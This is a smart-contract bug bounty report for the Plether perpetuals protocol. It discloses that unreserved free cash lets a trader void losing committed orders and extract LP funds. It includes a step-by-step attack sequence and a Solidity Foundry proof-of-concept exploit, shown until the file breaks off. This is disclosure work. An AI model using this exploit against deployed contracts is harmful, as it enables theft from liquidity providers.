# \#99048 [SC-Low] Unreserved VPI funding lets traders selectively void losing committed skew-reducing opens

**Submitted on Nov 11th 2026 at 16:43:39 UTC by @viraz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99048
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Description

Plether's delayed orders are intended to be binding. `SECURITY.md:656-659` says that binding order semantics and the absence of a user cancellation path prevent traders from turning queued intents into free options. `WHITEPAPER.md:1137-1142` says that binding orders reduce the ability to treat a queue position as a free option, and `packages/perps-aa-client/README.md:197` states that committed delayed orders have no trader cancellation function.

The current commitment path does not reserve every account-controlled asset on which an accepted skew-reducing open depends.

When an open is committed, `_validatedOpenBounty` asks `engineLensForCommit().previewOpenRevertCode` to validate the open against the account's current state (`router/OrderLiquidationBatchLogic.sol:404-445`). The Router then reserves the execution bounty and `marginDelta` (`router/OrderCommitHandler.sol:21-35`). `_reserveCommittedMargin` locks only the declared margin delta (`router/OrderReservationAccounting.sol:130-146`).

For an open that reduces the protocol's long/short imbalance, execution can require a VPI rebate reserve. `_planOpenReserveFunding` first assigns that reserve increase to `openCostPlan.resultingFreeSettlementAssets`. Only the amount not covered by free cash is assigned to the new position pledge (`libraries/CfdEnginePlanLib.sol:546-579`). If the pledge cannot cover the remainder, planning returns `VPI_REBATE_RESERVE_UNFUNDED`.

The free settlement used by the successful commitment preview is not locked with the order. `MarginClearinghouse.withdrawMargin` lets the account withdraw any balance that remains above the explicitly locked buckets (`MarginClearinghouse.sol:410-417` and `441-477`). `getFreeBuyingPowerAssets` confirms that only typed locked-margin buckets are treated as encumbered (`MarginClearinghouse.sol:494-505`).

Consequently, the trader can commit an open that succeeds only because its current free cash funds part of the VPI rebate reserve, then remove that cash before execution. Execution replans from the live account balances. The same order then returns `VPI_REBATE_RESERVE_UNFUNDED`, which is classified as an execution-time user-invalid failure (`libraries/CfdEnginePlanLib.sol:107-129`). The execution sidecar turns that typed planner failure into the permanent terminal outcome `PlannerRejected` (`OrderRouterExecutionSidecar.sol:840-858`).

This creates a post-commit cancellation primitive even though the Router exposes no cancellation function.

### Attack sequence

The PoC uses organic opposite-side skew created by an unrelated account. This represents an ordinary market state, not attacker-supplied collateral:

1. Another trader already has a `300,000 USDG` long position.
2. The attacker funds its account with `100,000 USDG` and commits a `100,000 USDG` skew-reducing short using `305 USDG` of declared order margin.
3. The commitment preview succeeds because the account's free settlement can fund the required VPI rebate reserve.
4. PletherOracle binds execution to the first Pyth tick after commitment. The order remains executable for 60 seconds, while `orderSettlementWindow` is 15 seconds (`PletherOracle.sol:87`, `610-614`; `router/OrderExecutionOrchestrator.sol:10-14`).
5. The attacker observes later prices and chooses one of two branches near the deadline:
   - If the move is favorable, the attacker executes at the already-bound commitment tick and closes at the later price.
   - If the move is unfavorable or too small to cover fees, the attacker atomically withdraws its free cash and self-executes. The order becomes terminal with `PlannerRejected`, the self-execution bounty returns to its source, and no USDG value moves to the LP pool or treasury.

At a later price `20` basis points above the bound execution tick, the PoC records:

| Account | Change |
|---|---:|
| Trader | `+118.859123 USDG` |
| LP pool | `-198.939123 USDG` |
| Protocol treasury | `+80.080000 USDG` |

At a later price `20` basis points in the other direction, the same committed order is voided with:

| Account | Change |
|---|---:|
| Trader | `0 USDG` |
| LP pool | `0 USDG` |
| Protocol treasury | `0 USDG` |

The causal control uses the same unfavorable price path but does not withdraw the execution-critical free cash. The order remains binding, fills at the commitment tick, and the round trip records:

| Account | Change without withdrawal |
|---|---:|
| Trader | `-279.920015 USDG` |
| LP pool | `+200.000015 USDG` |
| Protocol treasury | `+79.920000 USDG` |

Neither branch is presented as a standalone vulnerability. A favorable fill is ordinary settlement if the commitment is genuinely binding, and the terminal void moves no LP funds by itself. The defect is that, after committing, the trader can unilaterally select between those outcomes by withdrawing account-controlled cash that the accepted execution plan requires. The control proves the missing downside: the same unfavorable commitment costs the trader `279.920015 USDG` when its backing remains, but becomes a zero-USDG terminal outcome after the backing is withdrawn. Repeated favorable selections transfer LP assets while the corresponding losing outcomes are removed.

The six-cycle test selects three profitable fills and three terminal voids. It records:

| Account | Aggregate change |
|---|---:|
| Trader | `+356.576562 USDG` |
| LP pool | `-596.816562 USDG` |
| Protocol treasury | `+240.240000 USDG` |

The value conservation checks prove that the attacker's net gain is funded by LP assets after the protocol's execution fees.

### Atomic smart-account cancellation

Plether uses SimpleAccount v0.8 accounts as supported trading accounts. The official client documents `executeBatch((address target,uint256 value,bytes data)[])` for multiple calls. A trader can therefore combine the following calls atomically:

1. `MarginClearinghouse.withdrawMargin(freeCash)`; and
2. `OrderRouter.executeOrder(orderId, priceData)`.

The PoC models that exact ABI and preserves the smart account as `msg.sender` for both in-scope calls. The atomic batch ends the order as `PlannerRejected` and changes the smart account's combined wallet plus clearinghouse USDG wealth by exactly zero.

Atomic batching removes the two-transaction race only for the void branch. The favorable branch still requires the commitment-tick fill followed by a separate close, so it remains exposed to price movement and transaction ordering before the close executes.

The deployed Arbitrum Sepolia SimpleAccount control was checked using read-only calls. Account `0x8aff8f1a58934f31ed97b750dd4bd13478f893df` still has the repository-pinned runtime code hash `0x41ee894da413cc99e8dec0a1784470eceb736845ad1591e06ff0ecdf0aca26c9`. Its `owner()` returned `0x230df23883d4dD7b9ba15252e83eEbADd07F5b62`, and `executeBatch([])` called from that owner returned successfully. No public-network transaction was sent.

These results were reproduced on November 11, 2026 with:

~~~bash
cast codehash --rpc-url https://sepolia-rollup.arbitrum.io/rpc \
  0x8aff8f1a58934f31ed97b750dd4bd13478f893df
# 0x41ee894da413cc99e8dec0a1784470eceb736845ad1591e06ff0ecdf0aca26c9

cast call --rpc-url https://sepolia-rollup.arbitrum.io/rpc \
  0x8aff8f1a58934f31ed97b750dd4bd13478f893df "owner()(address)"
# 0x230df23883d4dD7b9ba15252e83eEbADd07F5b62

cast call --rpc-url https://sepolia-rollup.arbitrum.io/rpc \
  --from 0x230df23883d4dD7b9ba15252e83eEbADd07F5b62 \
  0x8aff8f1a58934f31ed97b750dd4bd13478f893df \
  "executeBatch((address,uint256,bytes)[])" "[]"
# 0x
~~~

### Costs and keeper competition

The terminal branch is zero-cost only in protocol-denominated USDG when the trader self-executes. It is not literally costless:

- Historical order execution pays for one unique Pyth parse and one storage update. `PletherOracle` requires `2 * pythFee` (`PletherOracle.sol:604-607`).
- The PoC configures an illustrative `0.001 ETH` fee per Pyth call and proves that the smart account pays `0.002 ETH` of oracle funding. This is test evidence for the fee path, not a claim about the current production Pyth price.
- The measured atomic withdraw-and-execute call consumes `1,103,428` gas inside the Foundry transaction. This excludes outer transaction intrinsic gas and Arbitrum L1 data charges.
- Hermes or equivalent signed-price access and transaction-ordering costs are additional feasibility costs.
- If another keeper terminalizes the invalid order, the trader loses the release-default `0.20 USDG` execution bounty. The PoC proves that exact transfer.

The attack is also subject to keeper competition. Any permissionless keeper can execute the order before the trader decides. The control test executes immediately and forces the smart-account order to fill, paying the keeper `0.20 USDG`. The report therefore does not claim that every committed order can be held until second 59 or that the option is unconditionally risk-free.

The production `executeOrder(orderId, priceData)` path executes the global queue head identified by `orderId`; after any permitted cleanup, the sidecar requires that the head equals the supplied ID (`OrderRouterExecutionSidecar.sol:128-207`). The PoC keeps the tested order at the queue head. It does not assume arbitrary execution of a non-head order.

The favorable branch also requires the attacker to close after the stale commitment-tick fill. It remains exposed to price movement and ordering between that fill and the closing execution.

These are feasibility limitations. The [competition scope](https://immunefi.com/audit-competition/plether/scope/) states that impact and severity are calculated separately from feasibility and that feasibility affects payout rather than the underlying impact classification.

### Organic-skew precondition

The vulnerable order must reduce existing opposite-side skew. The principal PoCs treat the `300,000 USDG` long as an unrelated trader's organic position and prove that this account's position and wealth do not change during the atomic void.

The report does not assume that the attacker can manufacture that skew for free. A separate control includes both the option account and the skew-producing account in the attacker's economics and closes both positions:

| Self-created-skew branch | Combined attacker result | LP pool | Treasury |
|---|---:|---:|---:|
| Exercise option after `+20` bps | `-721.389459 USDG` | `+521.309459 USDG` | `+200.080000 USDG` |
| Void option after `-20` bps | `+358.236547 USDG` | `-478.236547 USDG` | `+120.000000 USDG` |

This control shows that creating the precondition adds material directional risk and changes the strategy's economics. The Critical claim relies on the permissionless attacker finding existing organic skew, not creating both sides itself.

### Relationship to SC-M4 and other known issues

The SC Audit Studio report contains `SC-M4: Risk Free Option in 60Sec Oracle Window`, marked fixed in PR 24. Its reported mechanism combined three different behaviors:

1. a keeper could select any price tick from the execution window;
2. two queued orders could be executed at different chosen ticks; and
3. an LP withdrawal could cause a `SOLVENCY_EXCEEDED` refund.

Commit `54c9d28406aa45bfc8a0eb76162e5e32ada792e0` on May 8, 2026 fixed the first component by requiring a post-commit oracle tick. The present PoC does not restore arbitrary keeper price selection and does not use an LP withdrawal or `SOLVENCY_EXCEEDED`.

Instead, it uses a new account-controlled cancellation primitive in the later reserve-funding design. Git history shows that `_planOpenReserveFunding` was introduced by commit `52b52d05bc19c977369d5a5a6f92acc67776ba75` on August 22, 2026, after the SC-M4 remediation. Commit `9acf2533be6b3ec0340dab42d22629696e4c206c` subsequently carried the same code through the October 27, 2026 USDC-to-USDG and token-neutral units/naming refactor. This report does not claim that `9acf2533b` redesigned the allocation behavior. Both the reserve-funding introduction and the later refactor postdate the SC-M4 fix.

The defensible relationship is:

> The SC-M4 remediation fixed arbitrary oracle-tick selection but did not preserve binding execution after account-controlled, unreserved free cash became part of open-reserve funding.

This satisfies the competition rule for a previous finding whose remediation is incomplete or where a later change introduces a new cancellation path.

The issue is also distinct from the documented Arbitrum and Pyth clock-alignment limitation (`HIGH-1`). That limitation concerns committing after observing a Pyth price that is already published because the Arbitrum timestamp trails the Pyth clock. In this PoC, the helper constructs the selected settlement tick with `publishTime = commitTime + 1`; the tick therefore does not exist when the trader commits. Only after commitment does the test advance the live market and choose whether to preserve or withdraw the order's backing. The no-withdrawal control and the void branch differ only by that post-commit withdrawal. The repeatability PoC demonstrates net-profitable LP extraction from this later cancellation choice, not from committing after seeing an already-published tick.

The issue is also distinct from Cecuro `MED-16` and `LOW-57`. `MED-16` concerns an open admitted against a stale cached mark that may already be invalid when committed. The PoC refreshes the mark immediately before commitment, and the no-withdrawal control proves that the accepted order executes successfully; it becomes invalid only after the trader removes free cash. `LOW-57` concerns sizing the keeper bounty from a stale cached mark. This PoC neither relies on an underpriced bounty nor changes the bounty calculation. Its self-executed terminal branch depends on unreserved free cash used by the execution plan.

The AI scan's informational finding about state-driven VPI changes concerns third-party skew or depth changes and bounty classification. Here the same trader deliberately removes its own free cash after a successful commitment to obtain a terminal cancellation and profitable selection. Cecuro LOW-30 concerns inconsistent fields in invalid preview output, not the missing reservation or binding-order failure.

## Impact

**Direct theft of user funds, whether at-rest or in-motion, other than unclaimed yield.**

LP deposits are the counterparty capital for Perps positions. The direct-theft claim rests on the combined selection right, not either branch in isolation. The attacker keeps fills whose later market value exceeds the round-trip fees and terminally voids the same committed risk when the move is unfavorable. The no-withdrawal control proves that the unfavorable commitment would otherwise transfer `279.920015 USDG` away from the trader, including `200.000015 USDG` to LPs and `79.920000 USDG` in fees. With withdrawal, that same branch moves zero USDG. Across six selections, the favorable branches remove `596.816562 USDG` from the pool while the trader gains `356.576562 USDG` and the treasury receives `240.240000 USDG`.

The attack can scale with existing organic skew, available LP depth, the configured skew limit, account capital, keeper competition, and the frequency of sufficiently large price moves during the execution window. The PoC uses deterministic mock prices to prove the on-chain mechanics and accounting. It does not claim a production frequency for `10` to `20` basis-point movements within 59 seconds.

Critical severity is claimed because the PoC demonstrates repeatable net-profitable LP extraction produced by an on-chain post-commit selection right: favorable commitments move LP funds to the attacker, while a trader-controlled state change removes the otherwise demonstrated losing outcomes. This is not a claim that the zero-value terminal transaction itself steals funds or that a single favorable fill is independently defective. The keeper race, oracle costs, closing risk, and availability of organic skew are disclosed feasibility limitations. If the program treats the fund-moving branch as entirely covered by known delayed-price economics, the remaining broken binding-order property may not independently map to a listed impact; the report states that triage risk rather than manufacturing a fallback severity.

## Recommendation

Make every account-controlled asset required by an accepted open execution plan unavailable for post-commit withdrawal.

At commitment, calculate the free-settlement amount used to fund the accepted plan's VPI rebate reserve and lock it in an order-specific reservation alongside `marginDelta` and the execution bounty. Execution should consume the reservation, and terminal cleanup should release any unused amount. If the protocol permits live-state VPI changes before execution, reserve a conservative amount bounded by the order's authenticated financial limits rather than only the exact commitment-time value.

The withdrawal guard should include this order-specific reserve in `totalLockedMargin`, so withdrawing unrelated free cash remains possible while withdrawing execution-critical backing does not.

Add regression tests for:

- a skew-reducing order whose accepted plan uses both declared margin and free settlement for VPI reserve funding;
- withdrawal after commitment;
- a SimpleAccount batch containing withdrawal plus self-execution;
- self-execution and third-party execution bounty dispositions;
- preservation of the binding order after free-cash withdrawal attempts;
- release of the additional reservation on execution, expiry, liquidation, and every terminal failure path;
- live skew or pool-depth changes that raise the reserve requirement after commitment; and
- conservation of clearinghouse custody and every typed reservation bucket.

As a defense-in-depth alternative, a terminal failure caused by the order owner's post-commit withdrawal could forfeit a meaningful committed amount instead of refunding the complete downside. That approach is less robust than reserving the required backing because it prices the cancellation instead of preserving binding execution.

## Proof of Concept

## Proof of Concept

The dedicated PoC contains eight tests.

### `test_AtomicSimpleAccountVoidsOrderAtZeroUsdGProtocolCost`

1. Creates unrelated organic skew.
2. Funds a SimpleAccount-style trader and commits the skew-reducing order.
3. Moves the live mark against the order while retaining the commitment tick.
4. Atomically withdraws all unreserved free cash and self-executes through `executeBatch`.
5. Confirms `PlannerRejected`, no position, and zero change in combined wallet plus clearinghouse USDG.
6. Confirms payment of the configured two-call Pyth funding and logs measured execution gas.
7. Confirms that the unrelated skew provider's position and wealth did not change.

### `test_BothBranchesEndToEnd`

1. Commits the same `100,000 USDG` skew-reducing open in two snapshots.
2. At `+20` basis points, fills at the commitment tick and closes at the later price.
3. Confirms trader gain of `118.859123 USDG`, LP loss of `198.939123 USDG`, and `80.080000 USDG` of treasury fees.
4. At `-20` basis points, withdraws the free cash and self-executes.
5. Confirms zero trader, LP, and treasury change on the terminal branch.

### `test_ControlWithoutWithdrawalUnfavourableOrderFillsAndLoses`

Uses the same `-20` basis-point path without withdrawing free cash. It confirms that the order fills, the trader loses `279.920015 USDG`, the LP pool gains `200.000015 USDG`, and the treasury receives `79.920000 USDG`. This isolates the post-commit withdrawal as the cause of the zero-USDG terminal outcome.

### `test_RepeatsAcrossSixCycles`

Runs six consecutive cycles on one account. It selects three fills and three voids and confirms aggregate trader profit of `356.576562 USDG`, LP loss of `596.816562 USDG`, and treasury fees of `240.240000 USDG`.

### `test_EarlyKeeperCanForceFill`

Executes the smart-account order immediately from a foreign keeper. It confirms that keeper competition can remove the option before the trader decides and that the keeper receives the `0.20 USDG` bounty.

### `test_ThirdPartyTerminalizationCostsTheBounty`

Withdraws the trader's free cash and has another keeper terminalize the order. It confirms that the trader pays exactly `0.20 USDG` and the keeper receives the same amount.

### `test_LateFillUsesCommitTickAfterMarkMoves`

Updates the live mark during the execution window, fills at second 59, and confirms that the position entry still uses the first post-commit tick.

### `test_AttackerCreatedSkewMustBeIncludedInEconomics`

Treats both the `300,000 USDG` skew position and the `100,000 USDG` option position as attacker-controlled. It closes both accounts and reports the combined results, proving that self-created skew is not a free precondition.

### Scope compliance

The PoC runs in the repository's Foundry suite at the exact in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It does not modify an in-scope contract.

`BasePerpTest` exposes its Router field and deployment hook through the nominal `LegacyOrderRouterHarness` type. The PoC overrides that hook and constructs `new OrderRouter(...)` with the production constructor and production sidecars. It casts the resulting address only to satisfy the fixture's return type. No `LegacyOrderRouterHarness` bytecode is deployed or executed, and every order uses production `commitOrder(OrderRequest)`.

The v2.0.0 deployment uses `ArbitrumSepoliaReleaseRouter`. That wrapper calls the base `OrderRouter` constructor and only changes `minOpenNotionalAssets` to `1000e6` (repository-root `script/DeployPerpsArbitrumSepolia.s.sol:103-129`). The PoC order has `100,000 USDG` notional, so this wrapper difference does not affect the tested path.

`FreeOptionSimpleAccountV08Mock` replaces an out-of-scope account component, not an in-scope Perps contract. It preserves the relevant v0.8 batch selector, account `msg.sender`, nested call values, and all-or-nothing behavior. Mock Pyth and mock USDG are also expressly permitted out-of-scope dependencies under the competition PoC rules.

### PoC test

Add the following complete file at `packages/perps/test/CommittedOpenFreeOptionPoC.t.sol`

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Minimal model of the supported SimpleAccount v0.8 batch ABI. The account remains
///      `msg.sender` for each protocol call and the complete batch is atomic. SimpleAccount
///      is outside the competition's in-scope Solidity contracts.
contract FreeOptionSimpleAccountV08Mock {

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    address public immutable owner;

    error ExecuteError(uint256 index, bytes errorData);

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function executeBatch(
        Call[] calldata calls
    ) external {
        require(msg.sender == owner, "only owner");
        for (uint256 i; i < calls.length; ++i) {
            (bool success, bytes memory returnData) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!success) {
                revert ExecuteError(i, returnData);
            }
        }
    }

    receive() external payable {}

}

/// @title PoC: unreserved free cash lets a trader void a binding skew-reducing open
contract CommittedOpenFreeOptionPoCTest is BasePerpTest {

    address internal constant OUTSIDER = address(0xBEEF01);
    address internal constant SMART_ACCOUNT_OWNER = address(0xA11CE);
    uint256 internal constant COMMIT_PRICE = 1e8;
    uint256 internal constant OPTION_NOTIONAL = 100_000e18;
    uint256 internal constant ORGANIC_SKEW_NOTIONAL = 300_000e18;
    uint256 internal constant OPTION_MARGIN = 305e6;
    uint256 internal constant ORGANIC_SKEW_MARGIN = 5000e6;
    uint256 internal constant ACCOUNT_FUNDING = 100_000e6;

    OrderRouter internal productionRouter;
    OrderLifecycleBook internal book;
    address[3] internal actors;

    function setUp() public override {
        super.setUp();
        productionRouter = OrderRouter(payable(address(router)));
        book = OrderLifecycleBook(address(productionRouter.lifecycleBook()));
        for (uint256 i; i < actors.length; ++i) {
            actors[i] = address(uint160(0xC0000 + i));
            _fundTrader(actors[i], ACCOUNT_FUNDING);
        }
        _refreshMark(COMMIT_PRICE);
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Deploys production OrderRouter and production sidecars. The cast only satisfies
    ///      BasePerpTest's legacy-typed fixture field; no harness bytecode is deployed.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter exactProductionRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(exactProductionRouter), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(payable(address(exactProductionRouter)));
    }

    function test_AtomicSimpleAccountVoidsOrderAtZeroUsdGProtocolCost() public {
        _createOrganicSkew();
        FreeOptionSimpleAccountV08Mock account = new FreeOptionSimpleAccountV08Mock(SMART_ACCOUNT_OWNER);
        assertEq(
            FreeOptionSimpleAccountV08Mock.executeBatch.selector,
            bytes4(keccak256("executeBatch((address,uint256,bytes)[])")),
            "unexpected SimpleAccount batch ABI"
        );
        _fundSimpleAccount(account);

        uint256 skewProviderWealthBefore = _wealth(actors[2]);
        uint256 usdWealthBefore = _wealth(address(account));
        uint64 id = _commitRebateShortFromSimpleAccount(account);
        uint64 commitTime = _commitTime(id);

        vm.warp(uint256(commitTime) + 30);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(0.998e8);
        _warpToOffset(commitTime, productionRouter.maxExecutionWindowSeconds() - 1);
        bytes[] memory data = _executionPriceData(COMMIT_PRICE);

        uint256 perPythCallFee = 0.001 ether;
        uint256 executionOracleFunding = 2 * perPythCallFee;
        baseMockPyth.setFee(perPythCallFee);
        vm.deal(address(account), executionOracleFunding);
        uint256 ethBefore = address(account).balance;
        uint256 freeCash = clearinghouse.getFreeBuyingPowerAssets(address(account));

        FreeOptionSimpleAccountV08Mock.Call[] memory calls = new FreeOptionSimpleAccountV08Mock.Call[](2);
        calls[0] = FreeOptionSimpleAccountV08Mock.Call({
            target: address(clearinghouse), value: 0, data: abi.encodeCall(clearinghouse.withdrawMargin, (freeCash))
        });
        calls[1] = FreeOptionSimpleAccountV08Mock.Call({
            target: address(productionRouter),
            value: executionOracleFunding,
            data: abi.encodeCall(productionRouter.executeOrder, (id, data))
        });
        uint256 gasBefore = gasleft();
        vm.prank(SMART_ACCOUNT_OWNER);
        account.executeBatch(calls);
        uint256 measuredCallGas = gasBefore - gasleft();

        assertEq(_size(address(account)), 0, "atomic void unexpectedly filled");
        assertEq(
            uint256(book.terminalOutcome(id).reason),
            uint256(OrderV3Types.TerminalReason.PlannerRejected),
            "unexpected terminal reason"
        );
        assertEq(_wealth(address(account)), usdWealthBefore, "atomic void changed account USDG wealth");
        assertEq(ethBefore - address(account).balance, executionOracleFunding, "Pyth funding was not paid");
        assertEq(_size(actors[2]), ORGANIC_SKEW_NOTIONAL, "unrelated skew position changed");
        assertEq(_wealth(actors[2]), skewProviderWealthBefore, "unrelated skew provider wealth changed");

        console2.log("atomic void protocol-denominated cost", usdWealthBefore - _wealth(address(account)));
        console2.log("atomic void Pyth funding wei", executionOracleFunding);
        console2.log("atomic batch measured call gas (excludes outer tx base/L1 data)", measuredCallGas);
    }

    function test_BothBranchesEndToEnd() public {
        _createOrganicSkew();
        address trader = actors[1];
        address treasury = engine.protocolTreasury();
        uint256 window = productionRouter.maxExecutionWindowSeconds();
        uint256 snap = vm.snapshotState();

        for (uint256 branch; branch < 2; ++branch) {
            uint256 traderBefore = _wealth(trader);
            uint256 poolBefore = pool.totalAssets();
            uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
            uint64 id = _commitRebateShort(trader);
            uint64 commitTime = _commitTime(id);
            uint256 later = branch == 0 ? 1.002e8 : 0.998e8;
            vm.warp(uint256(commitTime) + 30);
            vm.roll(vm.getBlockNumber() + 1);
            _refreshMark(later);
            _warpToOffset(commitTime, window - 1);

            if (branch == 0) {
                _executeHead(trader, COMMIT_PRICE);
                assertEq(_size(trader), OPTION_NOTIONAL, "favourable branch did not fill");
                (,, uint256 entry,,,,) = engine.positions(trader);
                assertEq(entry, COMMIT_PRICE, "fill did not use commit tick");
                _commitFullClose(1);
                _executeHead(trader, later);
            } else {
                uint256 freeCash = clearinghouse.getFreeBuyingPowerAssets(trader);
                vm.prank(trader);
                clearinghouse.withdrawMargin(freeCash);
                _executeHead(trader, COMMIT_PRICE);
                assertEq(
                    uint256(book.terminalOutcome(id).reason),
                    uint256(OrderV3Types.TerminalReason.PlannerRejected),
                    "unexpected terminal reason"
                );
            }

            int256 traderNet = int256(_wealth(trader)) - int256(traderBefore);
            int256 poolDelta = int256(pool.totalAssets()) - int256(poolBefore);
            int256 fees = int256(clearinghouse.balanceAssets(treasury)) - int256(treasuryBefore);
            console2.log(branch == 0 ? "favourable branch (+20 bps)" : "unfavourable branch (-20 bps)");
            console2.logInt(traderNet);
            console2.logInt(poolDelta);
            console2.logInt(fees);
            assertApproxEqAbs(traderNet + poolDelta + fees, 0, 2, "value leaked");
            if (branch == 0) {
                assertGt(traderNet, 0, "favourable branch not profitable");
                assertLt(poolDelta, 0, "LPs did not fund the result");
            } else {
                assertEq(traderNet, 0, "void branch changed trader USDG wealth");
                assertEq(poolDelta, 0, "void branch moved LP value");
                assertEq(fees, 0, "void branch charged a protocol fee");
            }
            vm.revertToState(snap);
        }
    }

    /// @notice Causal control: without the post-commit withdrawal, the same unfavourable price path remains binding.
    ///         The order fills at the committed tick and the round trip realizes a trader loss instead of a terminal void.
    function test_ControlWithoutWithdrawalUnfavourableOrderFillsAndLoses() public {
        _createOrganicSkew();
        address trader = actors[1];
        address treasury = engine.protocolTreasury();
        uint256 traderBefore = _wealth(trader);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);

        uint64 id = _commitRebateShort(trader);
        uint64 commitTime = _commitTime(id);
        uint256 later = 0.998e8;
        vm.warp(uint256(commitTime) + 30);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(later);
        _warpToOffset(commitTime, productionRouter.maxExecutionWindowSeconds() - 1);

        _executeHead(trader, COMMIT_PRICE);
        assertEq(_size(trader), OPTION_NOTIONAL, "unwithdrawn order did not fill");
        _commitFullClose(1);
        _executeHead(trader, later);
        assertEq(_size(trader), 0, "control close did not fill");

        int256 traderNet = int256(_wealth(trader)) - int256(traderBefore);
        int256 poolDelta = int256(pool.totalAssets()) - int256(poolBefore);
        int256 fees = int256(clearinghouse.balanceAssets(treasury)) - int256(treasuryBefore);
        console2.log("unfavourable no-withdrawal trader result");
        console2.logInt(traderNet);
        console2.logInt(poolDelta);
        console2.logInt(fees);
        assertLt(traderNet, 0, "binding control did not realize trader downside");
        assertGt(poolDelta, 0, "LPs did not receive the control downside");
        assertApproxEqAbs(traderNet + poolDelta + fees, 0, 2, "control value leaked");
    }

    function test_RepeatsAcrossSixCycles() public {
        _createOrganicSkew();
        address trader = actors[1];
        address treasury = engine.protocolTreasury();
        int256[6] memory laterBps = [int256(20), -20, 15, -10, 5, 25];
        uint256 traderStart = _wealth(trader);
        uint256 poolStart = pool.totalAssets();
        uint256 treasuryStart = clearinghouse.balanceAssets(treasury);
        uint256 fills;

        for (uint256 i; i < laterBps.length; ++i) {
            uint256 traderBefore = _wealth(trader);
            _tick();
            _refreshMark(COMMIT_PRICE);
            uint64 id = _commitRebateShort(trader);
            uint64 commitTime = _commitTime(id);
            uint256 later = uint256(int256(COMMIT_PRICE) + laterBps[i] * 1e4);
            vm.warp(uint256(commitTime) + 30);
            vm.roll(vm.getBlockNumber() + 1);
            _refreshMark(later);
            _warpToOffset(commitTime, productionRouter.maxExecutionWindowSeconds() - 1);

            if (laterBps[i] >= 10) {
                _executeHead(trader, COMMIT_PRICE);
                _commitFullClose(1);
                _executeHead(trader, later);
                assertGt(_wealth(trader), traderBefore, "selected fill was not profitable");
                ++fills;
            } else {
                uint256 freeCash = clearinghouse.getFreeBuyingPowerAssets(trader);
                vm.prank(trader);
                clearinghouse.withdrawMargin(freeCash);
                _executeHead(trader, COMMIT_PRICE);
                assertEq(_size(trader), 0, "selected void filled");
                assertEq(_wealth(trader), traderBefore, "selected void changed USDG wealth");
                vm.startPrank(trader);
                settlementToken.approve(address(clearinghouse), freeCash);
                clearinghouse.depositMargin(freeCash);
                vm.stopPrank();
            }
        }

        int256 traderNet = int256(_wealth(trader)) - int256(traderStart);
        int256 poolNet = int256(pool.totalAssets()) - int256(poolStart);
        int256 fees = int256(clearinghouse.balanceAssets(treasury)) - int256(treasuryStart);
        console2.log("cycles", laterBps.length);
        console2.log("filled cycles", fills);
        console2.logInt(traderNet);
        console2.logInt(poolNet);
        console2.logInt(fees);
        assertEq(fills, 3, "unexpected fill count");
        assertGt(traderNet, 0, "cycles were not profitable");
        assertLt(poolNet, 0, "LPs did not lose value");
        assertApproxEqAbs(traderNet + poolNet + fees, 0, 10, "value leaked");
    }

    function test_EarlyKeeperCanForceFill() public {
        _createOrganicSkew();
        FreeOptionSimpleAccountV08Mock account = new FreeOptionSimpleAccountV08Mock(SMART_ACCOUNT_OWNER);
        _fundSimpleAccount(account);
        uint64 id = _commitRebateShortFromSimpleAccount(account);

        uint256 keeperBefore = _wealth(OUTSIDER);
        bytes[] memory data = _executionPriceData(COMMIT_PRICE);
        vm.prank(OUTSIDER);
        productionRouter.executeOrder(id, data);

        assertEq(_size(address(account)), OPTION_NOTIONAL, "early keeper did not force fill");
        assertEq(_wealth(OUTSIDER) - keeperBefore, 0.2e6, "unexpected keeper bounty");
        console2.log("early keeper bounty", _wealth(OUTSIDER) - keeperBefore);
    }

    function test_ThirdPartyTerminalizationCostsTheBounty() public {
